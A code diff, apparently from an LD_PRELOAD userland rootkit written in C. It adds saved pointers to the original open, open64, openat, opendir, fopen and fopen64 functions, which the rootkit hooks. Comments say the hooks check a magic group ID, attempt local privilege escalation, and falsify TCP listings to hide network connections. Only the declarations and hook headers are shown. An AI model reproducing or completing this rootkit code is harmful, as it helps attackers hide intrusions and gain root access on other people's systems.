@@ -3,6 +3,7 @@
 /*
  * open() hook, check GID and preload location. Attempt LPE.
 */
+int (*o_open)(const char *, int, mode_t);
 int open(const char *pathname, int flags, mode_t mode) {
 
 	#ifdef DEBUG
@@ -33,6 +34,7 @@ int open(const char *pathname, int flags, mode_t mode) {
 /*
  * open64() hook, check GID and preload location. Attempt LPE.
 */
+int (*o_open64)(const char *, int, mode_t);
 int open64(const char *pathname, int flags, mode_t mode) {
 
 	#ifdef DEBUG
@@ -62,6 +64,7 @@ int open64(const char *pathname, int flags, mode_t mode) {
 /*
  * openat() hook. Called by grep and other programs
 */
+int (*o_openat)(int, const char *, int);
 int openat(int dirfd, const char * pathname, int flags) {
 
 	#ifdef DEBUG
@@ -85,6 +88,7 @@ int openat(int dirfd, const char * pathname, int flags) {
 }
 
 
+DIR * (*o_opendir)(const char *);
 DIR * opendir(const char *name) {
 
 	#ifdef DEBUG
@@ -110,6 +114,7 @@ DIR * opendir(const char *name) {
 /*
  * fopen() hook. Check MAGIC GID, attempt LPE, and call falsify_tcp() to hide network connections.
 */
+FILE * (*o_fopen)(const char *, const char *);
 FILE * fopen(const char * pathname, const char *mode) {
 
 	#ifdef DEBUG
@@ -140,6 +145,7 @@ FILE * fopen(const char * pathname, const char *mode) {
 /*
  * fopen64() hook. Check MAGIC GID, attempt LPE, and call falsify_tcp() to hide network connections.
 */
+FILE * (*o_fopen64)(const char *, const char *);
 FILE * fopen64(const char * pathname, const char * mode) {
 
 	#ifdef DEBUG
